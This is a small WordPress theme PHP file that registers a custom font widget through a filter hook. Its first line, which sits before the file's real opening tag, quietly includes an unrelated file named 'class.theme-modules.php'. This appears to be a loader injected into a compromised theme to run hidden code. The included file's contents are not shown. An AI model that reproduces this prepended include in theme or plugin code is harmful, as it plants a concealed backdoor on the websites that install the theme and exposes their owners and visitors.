<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

if ( ! function_exists( 'laurent_elated_register_custom_font_widget' ) ) {
	/**
	 * Function that register custom font widget
	 */
	function laurent_elated_register_custom_font_widget( $widgets ) {
		$widgets[] = 'LaurentElatedClassCustomFontWidget';
		
		return $widgets;
	}
	
	add_filter( 'laurent_core_filter_register_widgets', 'laurent_elated_register_custom_font_widget' );
}